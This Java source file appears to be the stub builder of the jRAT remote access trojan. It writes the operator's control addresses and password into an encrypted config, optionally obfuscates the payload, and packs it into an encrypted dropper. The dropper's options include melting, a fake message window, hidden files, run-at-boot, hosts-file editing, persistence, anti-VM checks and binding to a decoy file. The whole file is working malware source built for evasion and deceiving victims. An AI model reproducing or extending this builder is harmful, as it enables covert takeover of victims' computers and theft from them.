package su.jrat.client.build;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import jrat.api.utils.JarUtils;
import su.jrat.client.BuildStatus;
import su.jrat.client.Constants;
import su.jrat.client.ErrorDialog;
import su.jrat.client.Globals;
import su.jrat.client.Main;
import su.jrat.client.OSConfig;
import su.jrat.client.addons.PluginList;
import su.jrat.client.addons.StubPlugin;
import su.jrat.client.crypto.FileCrypter;
import su.jrat.client.listeners.BuildListener;
import su.jrat.client.ui.dialogs.DialogSummary;
import su.jrat.client.utils.ZkmUtils;
import su.jrat.common.codec.Base64;
import su.jrat.common.codec.Hex;
import su.jrat.common.crypto.Crypto;
import su.jrat.common.hash.Md5;
import su.jrat.common.hash.Sha1;

import com.redpois0n.zkmlib.Configuration;

public class Build {

	public static void copy(InputStream input, OutputStream output) throws Exception {
		byte[] buffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = input.read(buffer)) != -1) {
			output.write(buffer, 0, bytesRead);
		}
	}

	@SuppressWarnings("resource")
	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm, boolean antivm) {
		listener.start();

		boolean obfuscate = zkm != null;
		
		if (!file.getName().toLowerCase().endsWith(".jar")) {
			file = new File(file.getAbsolutePath() + ".jar");
		}

		ZipFile inputStub = null;
		ZipOutputStream outputStub = null;
		ZipEntry entry = null;

		listener.reportProgress(5, "Preparing...", BuildStatus.INFO);

		File tempStubCleanJar = null;
		File tempCryptedNotRunnableJar = null;
		
		Sha1 sha1 = new Sha1();
		Md5 md5 = new Md5();

		try {
			
			KeyGenerator keyGen = KeyGenerator.getInstance("AES");
	        keyGen.init(128);
	        SecretKey secretKey = keyGen.generateKey();
	        byte[] key = secretKey.getEncoded();

			File output;		

			tempStubCleanJar = File.createTempFile(Constants.NAME + "-Builder-Temp" + (new Random()).nextInt(), ".jar");
			tempCryptedNotRunnableJar = File.createTempFile(Constants.NAME + "-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
			long start = System.currentTimeMillis();
			
			if (obfuscate) {
				output = File.createTempFile(Constants.NAME + "-Builder-Temp", ".jar");
			} else if (dropper) {
				output = tempStubCleanJar;
			} else {
				output = file;
			}

			inputStub = new ZipFile(buildFrom);

			outputStub = new ZipOutputStream(new FileOutputStream(output));

			Enumeration<? extends ZipEntry> entries = inputStub.entries();
			while (entries.hasMoreElements()) {
				entry = entries.nextElement();
				
				InputStream inputStream = inputStub.getInputStream(entry);
				
				listener.reportProgress(25, "Writing " + entry.getName() + " (" + inputStream.available() + " bytes)", BuildStatus.INFO);
				outputStub.putNextEntry(entry);
				if (!entry.isDirectory()) {
					copy(inputStream, outputStub);
				}
				outputStub.closeEntry();
				listener.reportProgress(50, "Wrote " + entry.getName(), BuildStatus.CHECK);
			}

			String addressString = "";

			for (String s : addresses) {
				addressString += s + ",";
			}
			
			if (addressString.startsWith(",")) {
				addressString = addressString.substring(1);
			}

			try {
				entry = new ZipEntry("config.dat");
				outputStub.putNextEntry(entry);

				Map<String, Object> config = new HashMap<String, Object>();

				config.put("addresses", addressString);
				config.put("id", id);
				config.put("pass", sha1.hashToString(pass));
				config.put("reconsec", reconSec);
				config.put("name", name);
				config.put("mutex", mutex);
				config.put("mport", mutexport);
				config.put("os", OSConfig.generateString(osconfig));
				config.put("timeout", timeout);
				config.put("toms", timeoutms);
				config.put("ti", trayicon);
				config.put("error", handleerr);
				config.put("per", persistance);
				config.put("perms", persistancems);
				config.put("debugmsg", debugmsg);
				config.put("vm", antivm);

				if (trayicon) {
					config.put("tititle", "");
					config.put("timsg", traymsg);
					config.put("timsgfail", traymsgfail);
					config.put("tititle", traytitle);
				}
				
				int configSize = 0;
				
				for (String str : config.keySet()) {
					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key);
					configSize += enc.length;
				}

				listener.reportProgress(30, "Writing config (" + configSize + " bytes)" , BuildStatus.INFO);
				
				for (String str : config.keySet()) {
					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key);
					outputStub.write(enc);
				}

				outputStub.closeEntry();
			} catch (Exception ex) {
				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
					listener.reportProgress(30, "Skipped config.dat, already exists.", BuildStatus.ERROR);
				} else {
					throw ex;
				}
			}

			if (trayicon) {
				InputStream trayIcon = null;

				if (icon == null || icon.equals("default")) {
					trayIcon = Main.class.getResourceAsStream("/icons/icon.png");
				} else {
					trayIcon = new FileInputStream(icon);
				}

				entry = new ZipEntry("icon.png");
				outputStub.putNextEntry(entry);
				copy(trayIcon, outputStub);
				outputStub.closeEntry();
			}

			try {
				entry = new ZipEntry("key.dat");
				outputStub.putNextEntry(entry);
				outputStub.write(key);
				outputStub.closeEntry();
			} catch (Exception ex) {
				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
					listener.reportProgress(30, "Skipped key.dat, already exists.", BuildStatus.ERROR);
				} else {
					throw ex;
				}
			}

			String[] plugins = null;

			if (pluginlist != null) {
				plugins = new String[pluginlist.plugins.size()];
				listener.reportProgress(50, "Writing " + pluginlist.plugins.size() + " plugins...", BuildStatus.INFO);

				for (int i = 0; i < pluginlist.plugins.size(); i++) {
					StubPlugin p = pluginlist.plugins.get(i);
					JarFile plugin = new JarFile(p.path);
					entries = plugin.entries();

					while (entries.hasMoreElements()) {
						entry = entries.nextElement();

						String mainClass = JarUtils.getMainClassFromInfo(plugin);

						if (entry.getName().replace("/", ".").replace(".class", "").equals(mainClass)) {
							plugins[i] = entry.getName().replace("/", ".").replace(".class", "");
						}

						entry = new ZipEntry(entry.getName());

						try {
							InputStream pluginInputStream = plugin.getInputStream(entry);
							listener.reportProgress(50, "Writing plugin resource " + entry.getName() + " (" + pluginInputStream.available() + " bytes)", BuildStatus.INFO);
							outputStub.putNextEntry(entry);
							copy(pluginInputStream, outputStub);
							outputStub.closeEntry();
							listener.reportProgress(50, "Wrote plugin resource " + entry.getName(), BuildStatus.CHECK);
						} catch (Exception ex) {
							listener.reportProgress(50, ex.getMessage(), BuildStatus.ERROR);
							continue;
						}
					}
					listener.reportProgress(50, "Wrote plugins", BuildStatus.CHECK);
				}
			}

			if (plugins != null) {
				entry = new ZipEntry("plugins.dat");
				outputStub.putNextEntry(entry);
				for (int i = 0; i < plugins.length; i++) {
					outputStub.write((plugins[i] + ",").getBytes("UTF-8"));
				}
				outputStub.closeEntry();
			}

			inputStub.close();
			outputStub.close();
			
			if (obfuscate) {
				if (dropper) {
					zkm.setInput(output);
					zkm.setOutput(tempStubCleanJar);
					ZkmUtils.obfuscateAtBuild(zkm, listener);
				} else {
					zkm.setInput(output);
					zkm.setOutput(file);
					ZkmUtils.obfuscateAtBuild(zkm, listener);
				}
			}

			if (dropper) {
				listener.reportProgress(50, "Writing stub into dropper (" + tempStubCleanJar.length() + " bytes)", BuildStatus.INFO);
				byte[] installerKey = key;
				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);

				if (obfuscate) {
					File temp = File.createTempFile("jrat-build-temp-obfuscated-installer", ".jar");
					zkm.setInput(Globals.getStubInstaller());
					zkm.setOutput(temp);
					ZkmUtils.obfuscateAtBuild(zkm, listener);
					inputStub = new ZipFile(temp);
				} else {
					inputStub = new ZipFile(Globals.getStubInstaller());
				}
				outputStub = new ZipOutputStream(new FileOutputStream(file));

				entries = inputStub.entries();
				while (entries.hasMoreElements()) {
					entry = entries.nextElement();
					outputStub.putNextEntry(entry);
					if (!entry.isDirectory()) {
						copy(inputStub.getInputStream(entry), outputStub);
					}
					outputStub.closeEntry();
				}

				if (edithost) {
					entry = new ZipEntry("host.dat");
					outputStub.putNextEntry(entry);
					outputStub.write(encode(overwritehost + "\n"));
					outputStub.write(encode(hosttext));
					outputStub.closeEntry();
				}

				entry = new ZipEntry("e");

				outputStub.putNextEntry(entry);
				copy(new FileInputStream(tempCryptedNotRunnableJar), outputStub);
				outputStub.closeEntry();

				entry = new ZipEntry("k");

				outputStub.putNextEntry(entry);

				outputStub.write(installerKey);
				outputStub.write(encodeLine(droppath));
				outputStub.write(encodeLine(name));
				outputStub.write(encodeLine(melt));
				outputStub.write(encodeLine(fakewindow));
				outputStub.write(encodeLine(fakemessage));
				outputStub.write(encodeLine(faketitle));
				outputStub.write(encodeLine(fakeicon));
				outputStub.write(encodeLine(delay));
				outputStub.write(encodeLine(delayms));
				outputStub.write(encodeLine(hiddenFile));
				outputStub.write(encodeLine(runNextBoot));

				outputStub.closeEntry();

				listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);

				if (bind) {
					File bindFile = new File(bindpath);
					String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());

					entry = new ZipEntry(bindname + extension);
					outputStub.putNextEntry(entry);

					FileInputStream fis = new FileInputStream(bindpath);
					copy(fis, outputStub);
					outputStub.closeEntry();

					fis.close();

					listener.reportProgress(90, "Writing file to bind... (" + bindFile.length() + " bytes)", BuildStatus.INFO);

					entry = new ZipEntry("bind.dat");
					outputStub.putNextEntry(entry);
					outputStub.write(encodeLine(droptarget));
					outputStub.write(encodeLine(bindname));
					outputStub.write(encodeLine(extension));
					outputStub.closeEntry();

					listener.reportProgress(90, "Wrote file to bind", BuildStatus.CHECK);

				}
				inputStub.close();
				outputStub.close();
			}

			long end = System.currentTimeMillis();
			
			listener.reportProgress(95, "MD5 of file: " + md5.hash(file), BuildStatus.INFO);
			listener.reportProgress(95, "SHA1 of file: " + sha1.hash(file), BuildStatus.INFO);

			listener.done("Saved stub. Took " + (end - start) + " ms, size " + (file.length() / 1024L) + " kB");

			DialogSummary frame = new DialogSummary(file, addressString, pass, id, listener.getStatuses());
			frame.setVisible(true);
		} catch (Exception ex) {
			String message = ex.getMessage();
			if (message == null) {
				message = "Failed building stub";
			}
			try {
				outputStub.close();
				inputStub.close();
			} catch (Exception ex1) {
			}

			ex.printStackTrace();
			listener.fail(message);
			ErrorDialog.create(ex);
		}

		try {
			tempCryptedNotRunnableJar.delete();
			tempStubCleanJar.delete();
		} catch (Exception ex1) {
			ex1.printStackTrace();
		}
	}

	public static byte[] encode(String s) throws Exception {
		s = Hex.encode(s);
		s = Base64.encode(s);
		return s.getBytes("UTF-8");
	}

	public static byte[] encodeLine(Object obj) throws Exception {
		return (new String(encode(obj.toString())) + ",").getBytes("UTF-8");
	}

}
